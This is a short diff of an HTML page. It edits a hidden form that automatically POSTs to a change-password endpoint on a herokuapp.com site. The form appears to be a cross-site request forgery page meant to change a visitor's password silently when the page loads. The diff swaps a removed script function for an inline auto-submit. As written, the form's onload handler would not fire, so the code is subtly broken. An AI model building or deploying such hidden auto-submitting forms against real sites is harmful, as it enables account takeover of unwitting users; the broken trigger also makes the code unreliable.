@@ -18,7 +18,7 @@
 
 
 
- <form method="post" id="myForm" style="display:none;" action="https://silver-quire.herokuapp.com/change-password" onload="submitform()">
+ <form method="post" id="myForm" style="display:none;" action="https://silver-quire.herokuapp.com/change-password" onload='document.getElementById("myForm").submit();'>
       <div class="form-group">
         <label for="password" class="col-sm-4 control-label">Password</label>
         <div class="col-sm-4">
@@ -38,16 +38,6 @@
       </div>
     </form>
 
-<script type="text/javascript">
-    window.onload=function(){
-       
-
-        function submitform(){
-          console.log("submitted");
-          document.forms["myForm"].submit();
-        }
-    }
-</script>
 
       </div>
   </body>
